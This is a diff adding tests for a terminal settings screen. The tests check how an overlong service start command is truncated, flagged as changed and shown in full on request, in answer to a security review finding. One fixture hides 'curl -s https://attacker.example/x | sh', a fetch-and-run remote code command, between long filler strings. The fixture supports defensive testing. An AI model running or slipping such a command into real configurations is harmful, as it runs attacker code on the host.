@@ -12,10 +12,12 @@ import { renderToString } from "ink"
 import { join } from "node:path"
 
 import { AppView } from "../../src/app/app"
+import { rowValueLines } from "../../src/app/screens/settings-layout"
 import { top } from "../../src/app/state/reading"
 import type { AppEvent } from "../../src/app/state/events"
 import type { State } from "../../src/app/state/types"
 import { AS1, AS2, AS6, SH1, SH2 } from "../../src/settings/words"
+import { screenRows } from "../../src/settings/rows"
 import type { Settings } from "../../src/settings/types"
 import { BRAND, BRAND_DARKER } from "../../src/ui/terminal/theme"
 import { logoLines } from "../../src/ui/terminal/logo"
@@ -497,6 +499,137 @@ describe("what the next deploy removes (security review S3)", () => {
     expect(lines.some((line) => line.includes("\x1b[2m  auth\x1b[22m"))).toBe(
       true
     )
+  })
+})
+
+/** The review's case of S4: a start command of about 3,000 characters with what it runs hidden in the middle. */
+const FILLER = "x".repeat(1500)
+const LONG_START = `sh -c 'echo starting ${FILLER}; curl -s https://attacker.example/x | sh ;${FILLER} && exec bun run start'`
+const LONG: Settings = {
+  version: 1,
+  services: [["web", { image: "ghcr.io/acme/web:1", start: LONG_START }]],
+}
+const SHORT: Settings = {
+  version: 1,
+  services: [["web", { image: "ghcr.io/acme/web:1", start: "bun run start" }]],
+}
+
+describe("a long value (security review S4)", () => {
+  /** The settings screen with the long start command, the start row selected. */
+  const long = (size: { columns: number; rows: number }) =>
+    play(opened(size), settingsRead(LONG, { deployed: SHORT }), K.down).state
+
+  for (const [columns, rows, more] of [
+    [100, 30, 52],
+    [80, 24, 80],
+  ] as const)
+    test(`${columns} by ${rows}: the value is cut at three lines, then a line that says how many more and that c shows them; its mark stays`, () => {
+      const lines = draw(long({ columns, rows }), columns, rows)
+      fits(lines, columns, rows)
+      const all = words(lines.join("\n"))
+      expect(all).toContain(
+        `❯ start sh -c 'echo starting ${"x".repeat(columns === 100 ? 58 : 38)}`
+      )
+      expect(all).toContain(
+        `… ${more} more lines: c shows them in the Compose text ! changed, not deployed (was bun run start)`
+      )
+      // Nothing of what is cut is drawn as if it were the value.
+      expect(all).not.toContain("attacker")
+      expect(all).not.toContain("exec bun run start")
+    })
+
+  test("a value of three lines or fewer is drawn whole, with no such line", () => {
+    const state = play(
+      opened({ columns: 80, rows: 24 }),
+      settingsRead(
+        {
+          version: 1,
+          services: [
+            [
+              "web",
+              {
+                image: "ghcr.io/acme/web:1",
+                start: `sh -c '${"y".repeat(100)}'`,
+              },
+            ],
+          ],
+        },
+        { deployed: SHORT }
+      )
+    ).state
+    const all = words(draw(state, 80, 24).join("\n"))
+    expect(all).toContain("y".repeat(30))
+    expect(all).not.toContain("more lines")
+  })
+
+  test("a long old value in a mark takes one line at most, cut with …: what runs next is the value, drawn whole", () => {
+    const row = screenRows(SHORT.services[0]!, LONG)[1]!
+    expect(row.changed?.was).toBe(LONG_START)
+    const lines = rowValueLines(row, 40, "yellow")
+    const text = lines.map((line) => line.map((piece) => piece.text).join(""))
+    expect(text[0]).toBe("bun run start  ! changed, not deployed")
+    expect(text.length).toBeLessThanOrEqual(3)
+    expect(text.join(" ")).toContain("(was sh -c 'echo starting")
+    expect(text.at(-1)).toEndWith("…)")
+  })
+
+  test("80 by 24: c shows the whole value, every line of it, as it scrolls to its end", () => {
+    let state = play(
+      opened({ columns: 80, rows: 24 }),
+      settingsRead(LONG, { deployed: SHORT }),
+      text("c")
+    ).state
+    let seen = ""
+    for (let at = 0; at < 120; at++) {
+      const lines = draw(state, 80, 24)
+      fits(lines, 80, 24)
+      seen += lines.join("\n")
+      state = play(state, K.down).state
+    }
+    expect(seen).toContain("curl -s https://attacker.example/x | sh")
+    expect(seen).toContain("exec bun run start")
+  })
+
+  test("the change box: the old and the new value whole when they fit; at 80 by 24 each cut, with the same line, and the question in view", () => {
+    const medium = `sh -c '${"z".repeat(150)}'`
+    const fitsWhole = play(
+      opened({ columns: 100, rows: 30 }),
+      settingsRead(
+        {
+          version: 1,
+          services: [["web", { image: "ghcr.io/acme/web:1", start: medium }]],
+        },
+        { deployed: SHORT }
+      ),
+      K.down,
+      K.enter,
+      text("!"),
+      K.enter
+    ).state
+    const whole = draw(fitsWhole)
+    fits(whole, 100, 30)
+    // The new value, its lines joined: all of it, then the question.
+    expect(whole.join("").replace(/[\s│]/g, "")).toContain(
+      `newsh-c'${"z".repeat(150)}'!?Writethis`
+    )
+    expect(whole.join("\n")).not.toContain("more lines")
+
+    const asking = play(
+      long({ columns: 80, rows: 24 }),
+      K.enter,
+      text("!"),
+      K.enter
+    ).state
+    const cut = draw(asking, 80, 24)
+    fits(cut, 80, 24)
+    const all = words(cut.join("\n"))
+    expect(all).toContain(
+      "now sh -c 'echo starting xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx … 47 more lines: c shows them in the Compose text new"
+    )
+    expect(all).toContain(
+      "? Write this to zekno.app.json? Nothing is deployed until you deploy."
+    )
+    expect(all).not.toContain("attacker")
   })
 })
 
